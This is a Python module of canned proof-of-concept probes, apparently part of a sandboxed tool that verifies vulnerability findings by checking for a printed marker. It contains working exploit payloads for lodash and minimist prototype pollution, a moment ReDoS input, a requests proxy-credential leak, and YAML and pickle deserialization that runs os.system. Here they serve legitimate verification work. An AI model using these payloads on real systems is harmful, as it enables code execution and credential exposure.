"""Verification probes — deterministic PoC skeletons per vuln class.

Same idea as nuclei templates: when the model's generated repro fails twice,
a class-appropriate canned probe still tests the claim mechanically inside
the sandbox. Each probe prints a distinctive marker only if the bug fires.
"""
from __future__ import annotations

import pathlib
import re

# Each entry: (vuln_class, lang, file_pattern|None, script_template, signal).
# First matching entry wins — put file-specific probes before generic ones.
# {SIG} is replaced per-finding (unique marker); {FILE} is the finding's
# repo-relative path under /src.
PROBES: list[tuple[str, str, str | None, str, str]] = [

    # lodash <=4.17.15 CVE-2020-8203: deep path setters accept __proto__
    ("prototype-pollution", "javascript", r"lodash", """#!/bin/bash
cat > /poc/probe.js <<'JS'
const _ = require('/src/{FILE}');
try { _.zipObjectDeep(['__proto__.probe_{SIG}'], ['yes']); } catch(e) {}
try { _.zipObjectDeep(['a.b.__proto__.probe_{SIG}'], ['yes']); } catch(e) {}
try { _.setWith({}, '__proto__.probe_{SIG}', 'yes'); } catch(e) {}
console.log(({}).probe_{SIG} === 'yes' ? 'VULN_CONFIRMED_{SIG}' : 'clean');
JS
node /poc/probe.js
""", "VULN_CONFIRMED_{SIG}"),

    # js prototype pollution via CLI arg parsing — minimist 1.2.5 shape:
    # constructor.constructor.prototype climbs to Function.prototype
    # (verified on the pinned repo; __proto__ and constructor.prototype
    # are already guarded there)
    ("prototype-pollution", "javascript", None, """#!/bin/bash
cat > /poc/probe.js <<'JS'
const parse = require('/src/{FILE}');
parse(['--constructor.constructor.prototype.probe_{SIG}', 'yes']);
const hit = ({}).probe_{SIG} === 'yes'
         || (function(){}).probe_{SIG} === 'yes';
console.log(hit ? 'VULN_CONFIRMED_{SIG}' : 'clean');
JS
node /poc/probe.js
""", "VULN_CONFIRMED_{SIG}"),

    # moment <=2.29.3 CVE-2022-31129: preprocessRFC2822 comment-strip is
    # quadratic on unbalanced parens — hostile input ~50x slower than control
    ("redos", "javascript", None, """#!/bin/bash
cat > /poc/probe.js <<'JS'
const moment = require('/src/{FILE}');
const evil = 'Mon, 25 Dec 1995 12:00:00 ' + '('.repeat(100000);
const t0 = Date.now();
moment(evil, moment.RFC_2822);
const hostile = Date.now() - t0;
const t1 = Date.now();
moment('Mon, 25 Dec 1995 12:00:00 +0000', moment.RFC_2822);
const control = Date.now() - t1;
console.log('hostile', hostile, 'ms; control', control, 'ms');
console.log(hostile > 2000 && control < 500 ? 'VULN_CONFIRMED_{SIG}' : 'clean');
JS
node /poc/probe.js
""", "VULN_CONFIRMED_{SIG}"),

    # requests <=2.30 CVE-2023-32681: rebuild_proxies re-attaches
    # Proxy-Authorization on https targets — tunnel creds leak to origin
    ("credential-leak", "python", r"sessions\.py|requests", """#!/bin/bash
cat > /poc/probe.py <<'PY'
import sys
sys.path.insert(0, "/src")
import requests
s = requests.Session()
prep = s.prepare_request(requests.Request("GET", "https://target.local/"))
s.rebuild_proxies(prep, {"https": "http://user:secret@proxy.local:8080"})
print("VULN_CONFIRMED_{SIG}"
      if "Proxy-Authorization" in prep.headers else "clean")
PY
python3 /poc/probe.py
""", "VULN_CONFIRMED_{SIG}"),

    # python object deserialization — yaml loader×payload matrix plus the
    # stdlib pickle reduce payload (pickle.loads is THE canonical deser-rce;
    # unsafe by design on every python version)
    ("deser", "python", None, """#!/bin/bash
cat > /poc/probe.py <<'PY'
import sys
# insert(0) pushes each new entry ahead — iterate reversed so the FIRST
# preferred dir ends up first in sys.path
for p in reversed(("/src/lib3", "/src/lib", "/src/src", "/src")):
    sys.path.insert(0, p)
try:
    import yaml
    loaders = [getattr(yaml, n) for n in ("UnsafeLoader", "Loader", "FullLoader")
               if getattr(yaml, n, None)]
    payloads = [
        "!!python/object/apply:os.system [\\"echo VULN_CONFIRMED_{SIG}\\"]",
        "!!python/object/new:os.system [\\"echo VULN_CONFIRMED_{SIG}\\"]",
    ]
    for L in loaders:
        for pl in payloads:
            try:
                yaml.load(pl, Loader=L)
            except Exception:
                pass
except ImportError:
    pass
import pickle
try:
    pickle.loads(b"cos\\nsystem\\n(S'echo VULN_CONFIRMED_{SIG}'\\ntR.")
except Exception:
    pass
PY
python3 /poc/probe.py
""", "VULN_CONFIRMED_{SIG}"),

    ("rce", "python", None, """#!/bin/bash
cat > /poc/probe.py <<'PY'
import sys
for p in reversed(("/src/lib3", "/src/lib", "/src/src", "/src")):
    sys.path.insert(0, p)
import yaml
loaders = [getattr(yaml, n) for n in ("UnsafeLoader", "Loader", "FullLoader")
           if getattr(yaml, n, None)]
payloads = [
    "!!python/object/apply:os.system [\\"echo VULN_CONFIRMED_{SIG}\\"]",
    "!!python/object/new:os.system [\\"echo VULN_CONFIRMED_{SIG}\\"]",
]
for L in loaders:
    for pl in payloads:
        try:
            yaml.load(pl, Loader=L)
        except Exception:
            pass
PY
python3 /poc/probe.py
""", "VULN_CONFIRMED_{SIG}"),
]

_EXT_LANG = {".py": "python", ".js": "javascript", ".ts": "javascript"}


def probe_for(vuln_class: str, file: str, finding_id: str):
    """Return (script, signal) for a canned probe or None."""
    lang = _EXT_LANG.get(pathlib.Path(file).suffix.lower())
    if not lang:
        return None
    ent = next((e for e in PROBES
                if e[0] == vuln_class and e[1] == lang
                and (e[2] is None or re.search(e[2], file, re.I))), None)
    if not ent:
        return None
    _, _, _, script, signal = ent
    sig = signal.replace("{SIG}", finding_id.upper()[:8])
    script = (script.replace("{SIG}", finding_id.upper()[:8])
                    .replace("{FILE}", file))
    return script, sig
